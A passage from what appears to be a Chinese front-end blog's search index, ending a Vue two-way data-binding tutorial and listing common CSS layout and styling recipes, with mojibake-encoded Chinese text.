Watcher(vm, node, name, <span class="string">'input'</span>);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// èŠ‚ç‚¹ç±»å‹ä¸ºtext</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (node.nodeType === <span class="number">3</span>) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (reg.test(node.nodeValue)) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> name = <span class="built_in">RegExp</span>.$<span class="number">1</span>; <span class="comment">// è·å–åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span></span><br><span class="line"><span class="undefined">                    name = name.trim();</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">new</span> Watcher(vm, node, name, <span class="string">'text'</span>);</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">Watcher</span> (<span class="params">vm, node, name, nodeType</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//  thisä¸ºwatcherå‡½æ•°</span></span></span><br><span class="line"><span class="javascript">            Dep.target = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//  console.log(this);</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.name = name;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.node = node;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.vm = vm;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.nodeType = nodeType;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.update();</span></span><br><span class="line"><span class="javascript">            Dep.target = <span class="literal">null</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        Watcher.prototype = &#123;</span></span><br><span class="line"><span class="javascript">            update: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.get();</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="keyword">this</span>.nodeType == <span class="string">'text'</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">this</span>.node.nodeValue = <span class="keyword">this</span>.value;</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="keyword">this</span>.nodeType == <span class="string">'input'</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">this</span>.node.value = <span class="keyword">this</span>.value;</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="comment">// è·å–daaä¸­çš„å±æ€§å€¼</span></span></span><br><span class="line"><span class="javascript">            get: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.value = <span class="keyword">this</span>.vm[<span class="keyword">this</span>.name]; <span class="comment">// è§¦å‘ç›¸åº”å±æ€§çš„get</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">Dep</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.subs = []</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        Dep.prototype = &#123;</span></span><br><span class="line"><span class="javascript">            addSub: <span class="function"><span class="keyword">function</span>(<span class="params">sub</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.subs.push(sub);</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="javascript">            notify: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.subs.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">sub</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">                    sub.update();</span></span><br><span class="line"><span class="undefined">                &#125;);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">Vue</span> (<span class="params">options</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.data = options.data;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> data = <span class="keyword">this</span>.data;</span></span><br><span class="line"><span class="javascript">            observe(data, <span class="keyword">this</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> id = options.el;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> dom = nodeToFragment(<span class="built_in">document</span>.getElementById(id), <span class="keyword">this</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">// ç¼–è¯‘å®Œæˆåï¼Œå°†domè¿”å›åˆ°appä¸­</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(id).appendChild(dom);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el: <span class="string">'app'</span>,</span></span><br><span class="line"><span class="undefined">            data: &#123;</span></span><br><span class="line"><span class="javascript">                text: <span class="string">'hello world'</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/38296857" target="_blank" rel="noopener">ç®€å•ç†è§£MVVMâ€“å®ç°Vueçš„MVVMæ¨¡å¼</a></li><li><a href="https://blog.devtang.com/2015/11/02/mvc-and-mvvm/" target="_blank" rel="noopener">è¢«è¯¯è§£çš„ MVC</a></li><li><a href="https://juejin.im/post/5b2f0769e51d45589f46949e" target="_blank" rel="noopener">Vue.jsä¸­çš„MVVM</a></li><li><a href="https://juejin.im/post/5b82b174518825431079d473" target="_blank" rel="noopener">Vue.jsçš„å“åº”å¼ç³»ç»ŸåŸç†</a></li><li><a href="https://ustbhuangyi.github.io/vue-analysis/data-driven/" target="_blank" rel="noopener">VueæŠ€æœ¯æ­ç§˜</a></li><li><a href="https://www.jianshu.com/p/2df6dcddb0d7" target="_blank" rel="noopener">å®ç°åŒå‘ç»‘å®šProxyæ¯”definepropertyä¼˜åŠ£å¦‚ä½•</a></li><li><a href="https://juejin.im/post/5dc267b15188255f6d42bd1a" target="_blank" rel="noopener">ä½¿ç”¨proxyå®ç°ä¸€ä¸ªåŒå‘ç»‘å®š</a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSSå¸¸ç”¨å®ä¾‹</title>
      <link href="/2018/11/06/CSS-example/"/>
      <url>/2018/11/06/CSS-example/</url>
      <content type="html"><![CDATA[<h4 id="1-å…¨å±èƒŒæ™¯"><a href="#1-å…¨å±èƒŒæ™¯" class="headerlink" title="1. å…¨å±èƒŒæ™¯"></a>1. å…¨å±èƒŒæ™¯</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">  background-image: url(1.png);         // èƒŒæ™¯å›¾è·¯å¾„</span><br><span class="line">  background-position: center center;   // èƒŒæ™¯å›¾å‚ç›´æ°´å¹³å±…ä¸­</span><br><span class="line">  background-repeat: no-repeat;         // ä¸å¹³é“º</span><br><span class="line">  background-attachment: fixed;         // å½“å†…å®¹é«˜åº¦å¤§äºå›¾ç‰‡é«˜åº¦æ—¶ï¼ŒèƒŒæ™¯å›¾åƒçš„ä½ç½®ç›¸å¯¹äºviewportå›ºå®š</span><br><span class="line">  background-size: cover;               // èƒŒæ™¯å›¾åŸºäºå®¹å™¨å¤§å°ä¼¸ç¼©</span><br><span class="line">  background-color: #fff;               // èƒŒæ™¯å›¾åŠ è½½è¿‡ç¨‹ä¸­æ˜¾ç¤ºçš„èƒŒæ™¯è‰²</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-å•è¡Œæº¢å‡º"><a href="#2-å•è¡Œæº¢å‡º" class="headerlink" title="2. å•è¡Œæº¢å‡º"></a>2. å•è¡Œæº¢å‡º</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a&#123;</span><br><span class="line">  max-width: 100px;        // å›ºå®šå®½åº¦</span><br><span class="line">  white-space: nowrap;     // ç¦æ­¢æ¢è¡Œ</span><br><span class="line">  overflow: hidden;        // éšè—æº¢å‡ºæ–‡æœ¬</span><br><span class="line">  text-overflow: ellipsis; // è¶…å‡ºéƒ¨åˆ†æ˜¾ç¤º...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-å¤šè¡Œæº¢å‡º"><a href="#3-å¤šè¡Œæº¢å‡º" class="headerlink" title="3. å¤šè¡Œæº¢å‡º"></a>3. å¤šè¡Œæº¢å‡º</h4><style>.content {  width: 80%;  max-height: 40px;  position: relative;  line-height: 1.4em;  overflow: hidden;  color: #4788C7;}.content::after {  content: "...";  position: absolute;  bottom: 0;  right: 0;  padding-left: 40px;  background: -webkit-linear-gradient(left, transparent, #fff 55%);  background: -o-linear-gradient(right, transparent, #fff 55%);  background: -moz-linear-gradient(right, transparent, #fff 55%);  background: linear-gradient(to right, transparent, #fff 55%);}</style><div class="content">å¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡ºå¤šè¡Œæº¢å‡º</div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.content &#123;</span><br><span class="line">  width: 80%;</span><br><span class="line">  max-height: 40px;</span><br><span class="line">  position: relative;</span><br><span class="line">  line-height: 1.4em;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.content::after &#123;</span><br><span class="line">  content: &quot;...&quot;;</span><br><span class="line">  position: absolute;</span><br><span class="line">  bottom: 0;</span><br><span class="line">  right: 0;</span><br><span class="line">  padding-left: 40px;</span><br><span class="line">  background: -webkit-linear-gradient(left, transparent, #fff 55%);</span><br><span class="line">  background: -o-linear-gradient(right, transparent, #fff 55%);</span><br><span class="line">  background: -moz-linear-gradient(right, transparent, #fff 55%);</span><br><span class="line">  background: linear-gradient(to right, transparent, #fff 55%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="4-è‡ªåŠ¨æ¢è¡Œ"><a href="#4-è‡ªåŠ¨æ¢è¡Œ" class="headerlink" title="4. è‡ªåŠ¨æ¢è¡Œ"></a>4. è‡ªåŠ¨æ¢è¡Œ</h4><p><code>word-wrap</code>å¯ä»¥æ§åˆ¶æ¢è¡Œï¼Œå½“å–å€¼<code>break-word</code>æ—¶å°†å¼ºåˆ¶æ¢è¡Œï¼Œä¸­è‹±æ–‡æ–‡æœ¬éƒ½æ— ä»»ä½•é—®é¢˜ï¼Œä½†æ˜¯å¯¹é•¿ä¸²çš„è‹±æ–‡ä¸èµ·ä½œç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´<code>break-word</code>æ˜¯ç”¨æ¥æ–­è¯è€Œä¸æ˜¯æ–­å­—ç¬¦ã€‚è€Œ<code>word-break</code>å–å€¼ä¸º<code>break-all</code>æ—¶ï¼Œå¯å…è®¸éäºšæ´²è¯­è¨€æ–‡æœ¬çš„ä»»æ„å­—ç¬¦æ–­å¼€ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œä½¿ç”¨<code>word-wrap:break-word</code>å£°æ˜å¯ä»¥ç¡®ä¿æ‰€æœ‰æ–‡æœ¬æ­£å¸¸æ˜¾ç¤ºã€‚ä½†åœ¨Firefoxæµè§ˆå™¨ä¸Šï¼Œé•¿ä¸²è‹±æ–‡ä¼šå‡ºç°é—®é¢˜(ä¸æ¢è¡Œ)ã€‚ä¸ºäº†è§£å†³é•¿ä¸²è‹±æ–‡é—®é¢˜ï¼Œä¸€èˆ¬å°†<code>word-wrap: break-word; word-break: break-all</code>ä¸€èµ·ä½¿ç”¨ã€‚ä½†æ˜¯è¿™æ ·åˆé€ æˆäº†ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼Œä¼šå¯¼è‡´æ™®é€šè‹±æ–‡è¯­å¥ä¸­çš„å•è¯æ–­è¡Œå½±å“é˜…è¯»ã€‚</p><p>ç»¼ä¸Šæ‰€è¿°ï¼Œä¸»è¦é—®é¢˜æ˜¯é•¿ä¸²è‹±æ–‡ä¸æ¢è¡Œå’Œè‹±æ–‡å•è¯ä¼šè¢«æ–­å¼€ã€‚ä¸¤è€…é€‰ä¸€ï¼Œåº”è¯¥ä½¿ç”¨<code>word-wrap: break-word; overflow:hidden</code>ç»“åˆï¼Œè€Œä¸æ˜¯<code>word-wrap: break-word; word-break:break-all</code>ç»“åˆã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">element&#123;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">  word-wrap: break-word;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-flex-ä¸Šä¸­ä¸‹å¸ƒå±€"><a href="#5-flex-ä¸Šä¸­ä¸‹å¸ƒå±€" class="headerlink" title="5. flex:ä¸Šä¸­ä¸‹å¸ƒå±€"></a>5. flex:ä¸Šä¸­ä¸‹å¸ƒå±€</h4><p>Chrome, Firefox, Safari, IE11, IE10æœ‰æ•ˆ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    .app&#123; </span><br><span class="line">      display: flex</span><br><span class="line">    &#125;</span><br><span class="line">    .wrapper&#123; </span><br><span class="line">      display: flex; </span><br><span class="line">      flex-direction: column; </span><br><span class="line">      min-height: 100vh;</span><br><span class="line">      width: 100%;</span><br><span class="line">    &#125;</span><br><span class="line">    section&#123; </span><br><span class="line">      flex: 1 0 auto;</span><br><span class="line">    &#125;</span><br><span class="line">    header, footer&#123; </span><br><span class="line">      height: 60px;</span><br><span class="line">      background: blue;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">      &lt;header&gt;&lt;/header&gt;</span><br><span class="line">      &lt;section&gt;&lt;/section&gt;</span><br><span class="line">      &lt;footer&gt;&lt;/footer&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-è®¾ç½®Selectä¸‹æ‹‰ç®­å¤´"><a href="#6-è®¾ç½®Selectä¸‹æ‹‰ç®­å¤´" class="headerlink" title="6. è®¾ç½®Selectä¸‹æ‹‰ç®­å¤´"></a>6. è®¾ç½®Selectä¸‹æ‹‰ç®­å¤´</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select &#123;</span><br><span class="line">  appearance:none;</span><br><span class="line">  -moz-appearance:none;</span><br><span class="line">  -webkit-appearance:none;</span><br><span class="line">  background: url(&quot;http://ourjs.github.io/static/2015/arrow.png&quot;) no-repeat scroll right center transparent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// IE</span><br><span class="line">select::-ms-expand &#123; display: none; &#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="7-lt-input-gt-checkbox-radioæ ·å¼è‡ªå®šä¹‰"><a href="#7-lt-input-gt-checkbox-radioæ ·å¼è‡ªå®šä¹‰" class="headerlink" title="7. &lt;input&gt; checkbox radioæ ·å¼è‡ªå®šä¹‰"></a>7. <code>&lt;input&gt; checkbox radio</code>æ ·å¼è‡ªå®šä¹‰</h4><ul><li><p>æ–¹æ³•1 å›¾ç‰‡æ›¿æ¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•2 </p></li></ul><h4 id="8-å¼¹çª—ï¼Œé®ç½©åå†…å®¹ä¸æ»šåŠ¨"><a href="#8-å¼¹çª—ï¼Œé®ç½©åå†…å®¹ä¸æ»šåŠ¨" class="headerlink" title="8. å¼¹çª—ï¼Œé®ç½©åå†…å®¹ä¸æ»šåŠ¨"></a>8. å¼¹çª—ï¼Œé®ç½©åå†…å®¹ä¸æ»šåŠ¨</h4><p>Bootstrap, Ant designæ–¹æ³•, å¼¹çª—å‡ºç°æ—¶ç»™bodyæ·»åŠ è¡Œå†…æ ·å¼<code>{overflow: hidden}</code>ï¼Œ å¼¹çª—æ¶ˆå¤±æ—¶<code>{overflow: auto}</code></p><h4 id="9-é˜»æ­¢å› å‡ºç°æ»šåŠ¨æ¡å¯¼è‡´é¡µé¢æŠ–åŠ¨"><a href="#9-é˜»æ­¢å› å‡ºç°æ»šåŠ¨æ¡å¯¼è‡´é¡µé¢æŠ–åŠ¨" class="headerlink" title="9. é˜»æ­¢å› å‡ºç°æ»šåŠ¨æ¡å¯¼è‡´é¡µé¢æŠ–åŠ¨"></a>9. é˜»æ­¢å› å‡ºç°æ»šåŠ¨æ¡å¯¼è‡´é¡µé¢æŠ–åŠ¨</h4><p>ä¿¡æ¯æµé¡µé¢ï¼Œå¦‚æ–°æµªå¾®åšï¼Œå¼€å§‹åªæœ‰å¤´éƒ¨ä¸€äº›ä¿¡æ¯åŠ è½½ï¼Œæ­¤æ—¶é¡µé¢é«˜åº¦æœ‰é™ï¼Œæ²¡æœ‰æ»šåŠ¨æ¡ï¼›ç„¶åï¼Œæ›´å¤šå†…å®¹æ˜¾ç¤ºï¼Œæ»šåŠ¨æ¡å‡ºç°ã€‚ <code>margin: 0 auto</code>ä¸»ä½“å…ƒç´ è‡ªç„¶ä¼šåšåç§»â€”â€”è·³åŠ¨äº§ç”Ÿã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">html &#123;</span><br><span class="line">  overflow-x: hidden;</span><br><span class="line">  overflow-y: auto;</span><br><span class="line">&#125;</span><br><span class="line">body &#123;</span><br><span class="line">  width: 100vw;</span><br><span class="line">  overflow-x: hidden;</span><br><span class="line">  padding-left: calc(100vw - 100%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="10-flexä¿æŒå†…å®¹ä¸è¶…å‡ºå®¹å™¨"><a href="#10-flexä¿æŒå†…å®¹ä¸è¶…å‡ºå®¹å™¨" class="headerlink" title="10. flexä¿æŒå†…å®¹ä¸è¶…å‡ºå®¹å™¨"></a>10. flexä¿æŒå†…å®¹ä¸è¶…å‡ºå®¹å™¨</h4><p>åœ¨ä¸€ä¸ªè®¾ç½®äº†<code>flex: 1</code>æˆ–<code>flex: 0 0 25%</code>çš„å®¹å™¨ä¸­ï¼Œå¦‚æœæ–‡å­—å¾ˆé•¿ï¼Œè¿™æ—¶å€™æ–‡å­—å°±ä¼šè¶…å‡ºå®¹å™¨ï¼Œè€Œä¸æ˜¯å‘†åœ¨è®¾ç½®å¥½çš„åŠ¨æ€å‰©ä½™ç©ºé—´ä¸­ã€‚å¯ä»¥ç»™<code>.content</code>æ·»åŠ <code>width:0</code>, .contentå°±ä¸ä¼šè¢«è‡ªå·±çš„å…ƒç´ æ— é™æ’‘å¼€ã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"aside"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.main</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.aside</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.content</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden; <span class="comment">/* å…¼å®¹firefox */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="10-çº¹ç†èƒŒæ™¯"><a href="#10-çº¹ç†èƒŒæ™¯" class="headerlink" title="10. çº¹ç†èƒŒæ™¯"></a>10. çº¹ç†èƒŒæ™¯</h4><p><a href="https://leaverou.github.io/css3patterns/" target="_blank" rel="noopener">æ›´å¤šè¯¦æƒ…æŸ¥çœ‹</a><br><style>.veins div{  width: 250px;  height: 250px;  display: inline-block;}.veins1{  background:  radial-gradient(black 15%, transparent 16%) 0 0,  radial-gradient(black 15%, transparent 16%) 8px 8px,  radial-gradient(rgba(255,255,255,.1) 15%, transparent 20%) 0 1px,  radial-gradient(rgba(255,255,255,.1) 15%, transparent 20%) 8px 9px;  background-color:#282828;  background-size:16px 16px;}.veins2{  background-color: #6d695c;  background-image:  repeating-linear-gradient(120deg, rgba(255,255,255,.1), rgba(255,255,255,.1) 1px, transparent 1px, transparent 60px),  repeating-linear-gradient(60deg, rgba(255,255,255,.1), rgba(255,255,255,.1) 1px, transparent 1px, transparent 60px),  linear-gradient(60deg, rgba(0,0,0,.1) 25%, transparent 25%, transparent 75%, rgba(0,0,0,.1) 75%, rgba(0,0,0,.1)),  linear-gradient(120deg, rgba(0,0,0,.1) 25%, transparent 25%, transparent 75%, rgba(0,0,0,.1) 75%, rgba(0,0,0,.1));  background-size: 70px 120px;}.veins3{  background-color:silver;  background-image:  radial-gradient(circle at 100% 150%, silver 24%, white 25%, white 28%, silver 29%, silver 36%, white 36%, white 40%, transparent 40%, transparent),  radial-gradient(circle at 0    150%, silver 24%, white 25%, white 28%, silver 29%, silver 36%, white 36%, white 40%, transparent 40%, transparent),  radial-gradient(circle at 50%  100%, white 10%, silver 11%, silver 23%, white 24%, white 30%, silver 31%, silver 43%, white 44%, white 50%, silver 51%, silver 63%, white 64%, white 71%, transparent 71%, transparent),  radial-gradient(circle at 100% 50%, white 5%, silver 6%, silver 15%, white 16%, white 20%, silver 21%, silver 30%, white 31%, white 35%, silver 36%, silver 45%, white 46%, white 49%, transparent 50%, transparent),  radial-gradient(circle at 0    50%, white 5%, silver 6%, silver 15%, white 16%, white 20%, silver 21%, silver 30%, white 31%, white 35%, silver 36%, silver 45%, white 46%, white 49%, transparent 50%, transparent);  background-size: 100px 50px;}.veins4{  background-color:#556;  background-image: linear-gradient(30deg, #445 12%, transparent 12.5%, transparent 87%, #445 87.5%, #445),  linear-gradient(150deg, #445 12%, transparent 12.5%, transparent 87%, #445 87.5%, #445),  linear-gradient(30deg, #445 12%, transparent 12.5%, transparent 87%, #445 87.5%, #445),  linear-gradient(150deg, #445 12%, transparent 12.5%, transparent 87%, #445 87.5%, #445),  linear-gradient(60deg, #99a 25%, transparent 25.5%, transparent 75%, #99a 75%, #99a),  linear-gradient(60deg, #99a 25%, transparent 25.5%, transparent 75%, #99a 75%, #99a);  background-size:80px 140px;  background-position: 0 0, 0 0, 40px 70px, 40px 70px, 0 0, 40px 70px;}.veins5{  background-color:#269;  background-image: linear-gradient(white 2px, transparent 2px),  linear-gradient(90deg, white 2px, transparent 2px),  linear-gradient(rgba(255,255,255,.3) 1px, transparent 1px),  linear-gradient(90deg, rgba(255,255,255,.3) 1px, transparent 1px);  background-size: 100px 100px, 100px 100px, 20px 20px, 20px 20px;  background-position:-2px -2px, -2px -2px, -1px -1px, -1px -1px;}.veins6{  background-color:#001;  background-image: radial-gradient(white 15%, transparent 16%),  radial-gradient(white 15%, transparent 16%);  background-size: 60px 60px;  background-position: 0 0, 30px 30px;}.veins7{  background-color: #fff;  background-image:  linear-gradient(90deg, transparent 79px, #abced4 79px, #abced4 81px, transparent 81px),  linear-gradient(#eee .1em, transparent .1em);  background-size: 100% 1.2em;}.veins8{  background-color:white;  background-image: linear-gradient(90deg, rgba(200,0,0,.5) 50%, transparent 50%),  linear-gradient(rgba(200,0,0,.5) 50%, transparent 50%);  background-size:50px 50px;}.veins9{  background-color: gray;  background-image: linear-gradient(90deg, transparent 50%, rgba(255,255,255,.5) 50%);  background-size: 50px 50px;}</style><div class="veins">  <div class="veins1"></div>  <div class="veins2"></div>  <div class="veins3"></div>  <div class="veins4"></div>  <div class="veins5"></div>  <div class="veins6"></div>  <div class="veins7"></div>  <div class="veins8"></div>  <div class="veins9"></div></div></p><p><br></p><h4 id="11-ä¸å®šå®½é«˜å…ƒç´ æ°´å¹³å‚ç›´å±…ä¸­"><a href="#11-ä¸å®šå®½é«˜å…ƒç´ æ°´å¹³å‚ç›´å±…ä¸­" class="headerlink" title="11. ä¸å®šå®½é«˜å…ƒç´ æ°´å¹³å‚ç›´å±…ä¸­"></a>11. ä¸å®šå®½é«˜å…ƒç´ æ°´å¹³å‚ç›´å±…ä¸­</h4><p><em>ä¸é€‚åˆçš„æ–¹æ¡ˆ</em></p><ul><li>text-alignå’Œline-height</li><li>position:absolute, 50%, margin: -px</li></ul><p><em>æ­£ç¡®çš„æ–¹æ³•</em></p><ul><li><p>display:tableå’Œdisplay:table-cell</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 